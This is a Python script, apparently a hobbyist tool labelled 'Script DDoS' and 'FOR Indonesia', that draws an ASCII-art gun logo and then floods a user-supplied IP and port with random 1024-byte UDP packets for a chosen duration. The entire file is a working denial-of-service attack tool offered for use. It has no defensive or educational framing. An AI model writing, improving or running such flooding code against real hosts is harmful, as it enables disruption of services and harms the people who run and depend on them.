import time
import socket
import random
import sys
import os
import itertools
from termcolor import colored



def logo():
    os.system(["clear", "cls"][os.name == 'nt'])
    Logo = '''


****************************************************************
* ____            _       _     _  ___     _     _ _           *
*/ ___|  ___ _ __(_)_ __ | |_  | |/ (_) __| | __| (_) ___  ___ *
*\___ \ / __| '__| | '_ \| __| | ' /| |/ _` |/ _` | |/ _ \/ __|*
* ___) | (__| |  | | |_) | |_  | . \| | (_| | (_| | |  __/\__ \*
*|____/ \___|_|  |_| .__/ \__| |_|\_\_|\__,_|\__,_|_|\___||___/*
*                  |_|                                         *
****************************************************************        
--------------------------------------------------------------------------------

 +--^----------,--------,-----,--------^-,
 | |||||||||   `--------'     |          O
 `+---------------------------^----------|
   `\_,---------,---------,--------------'
     / XXXXXX /'|       /'
    / XXXXXX /  `\    /'
   / XXXXXX /`-------'
  / XXXXXX /
 / XXXXXX /
(________(                
 `------'    
⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄
Tool By  {g}  {r}     \n'''.format(g=colored('Script DDos', 'red'), w=colored('', 'white'), r=colored('FOR Indonesia', 'yellow'))

    colors = itertools.cycle([colored('', 'red'), colored('', 'green')])

    for Line in Logo.split('\n'):
        print(next(colors) + Line)
        time.sleep(0.1)


logo()

def usage():
    print(colored("Tool Script DDoS", "red"))

    victim = input(colored('ENTER THE IP : ', "yellow", attrs=['bold']))
    vport = int(input(colored('ENTER THE PORT [ 80 - 443 ] : ', "green", attrs=['bold'])))
    duration = int(input(colored('ENTER THE TURBO [SPEED]: ', "red", attrs=['bold'])))
    flood(victim, vport, duration)

def flood(victim, vport, duration):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1024)
    timeout = time.time() + duration
    sent = 3000

    while 1:
        if time.time() > timeout:
            break
        else:
            pass
        client.sendto(bytes, (victim, vport))
        sent = sent + 1
        print(colored("Hajar", "green"), colored(str(sent), "green"), colored("Gasskeuen", "green"), colored(victim, "green"), colored("at the port", "green"), colored(str(vport), "green"))



def main():
    try:
        usage()
    except KeyboardInterrupt:
        pass


if __name__ == '__main__':
    main()
